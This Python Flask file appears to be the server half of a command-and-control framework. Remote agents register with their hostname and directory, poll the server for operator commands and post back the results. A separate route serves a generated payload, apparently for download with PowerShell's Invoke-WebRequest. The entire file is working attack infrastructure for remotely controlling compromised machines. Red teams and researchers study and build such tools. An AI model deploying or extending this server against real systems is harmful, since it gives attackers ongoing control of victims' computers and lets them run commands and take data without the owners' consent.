import argparse, json, logging, uuid
from flask import Flask, request, Response
from agent import Agent
from payload import *

parser = argparse.ArgumentParser()
parser.add_argument("-r", "--route", help="the api endpoint the agent will connect to")
parser.add_argument("-lp", "--lport", help="the port the agent will connect to (default: 5000)")
parser.add_argument("-u", "--url", help="the url the agent will connect to")
args, leftovers = parser.parse_known_args()

#route = args.route
route = args.route
lport = args.lport if args.lport is not None else '5000'
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)
api = Flask(__name__)
agents = []

@api.route('/' + route + '/register', methods=['GET', 'POST'])
def register_agent():
    id = str(uuid.uuid4())
    agent = Agent(id, request.json['hostname'], request.json['cwd'])
    agents.append(agent)
    return agent.id

@api.route('/' + route + '/iwr', methods=["GET"])
def get_payload():
    return generate_payload(args.url)

@api.route('/' + route + '/<id>', methods=['GET', 'POST'])
def execute_commands(id):
    for agent in agents:
        if agent.id == id:
            if request.method == 'POST':
                agent.set_result(request.data.decode())
            elif request.method == 'GET' and not agent.has_run:
                return agent.command
    return ''

@api.route('/agents', methods=['GET'])
def get_agents():
    ret = []
    for agent in agents:
        ret.append([agent.id, agent.hostname, agent.cwd])
    return ret

@api.route('/agents/<id>', methods=['GET', 'DELETE'])
def get_delete_agent(id):
    if request.method == 'GET':
        for agent in agents:
            if agent.id == id:
                return [agent.id, agent.hostname, agent.cwd]
        return []
    elif request.method == 'DELETE':
        for agent in agents:
            if agent.id == id:
                agents.remove(agent)
                return 'True'
        return 'False'

@api.route('/cmd/<id>', methods=['GET', 'POST'])
def set_command(id):
    for agent in agents:
        if agent.id == id:
            if request.method == 'POST':
                agent.new_command(request.data.decode())
                return 'True'
            elif request.method == 'GET':
                return agent.get_result()
    return ''

if __name__ == '__main__':
    try:
        api.run(host="0.0.0.0", port=lport)
    except KeyboardInterrupt:
        exit